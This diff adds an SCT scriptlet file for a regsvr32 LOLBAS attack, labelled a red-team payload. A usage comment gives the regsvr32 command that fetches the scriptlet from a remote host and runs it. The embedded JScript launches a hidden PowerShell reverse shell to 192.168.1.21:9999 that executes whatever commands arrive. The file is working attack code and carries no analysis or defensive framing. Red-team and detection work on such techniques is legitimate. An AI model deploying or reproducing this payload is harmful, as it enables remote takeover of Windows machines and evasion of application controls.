@@ -1,0 +1,38 @@
+<?XML version="1.0"?>
+<!-- SCT File for RegSvr32 LOLBAS Attack -->
+<!-- Usage: regsvr32.exe /s /n /u /i:http://192.168.1.21:8000/payload.sct scrobj.dll -->
+<scriptlet>
+
+<registration
+    description="Red Team Payload"
+    progid="RedTeam.Payload"
+    version="1.00"
+    classid="{A1112221-0000-0000-0000-000000000001}"
+    >
+</registration>
+
+<script language="JScript">
+<![CDATA[
+
+// PowerShell reverse shell payload
+var command = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command " +
+    "\"$client = New-Object System.Net.Sockets.TCPClient('192.168.1.21',9999);" +
+    "$stream = $client.GetStream();" +
+    "[byte[]]$bytes = 0..65535|%{0};" +
+    "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){" +
+    "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);" +
+    "$sendback = (iex $data 2>&1 | Out-String );" +
+    "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';" +
+    "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);" +
+    "$stream.Write($sendbyte,0,$sendbyte.Length);" +
+    "$stream.Flush()};" +
+    "$client.Close()\"";
+
+// Create WScript.Shell object and execute
+var shell = new ActiveXObject("WScript.Shell");
+shell.Run(command, 0, false);
+
+]]>
+</script>
+
+</scriptlet>
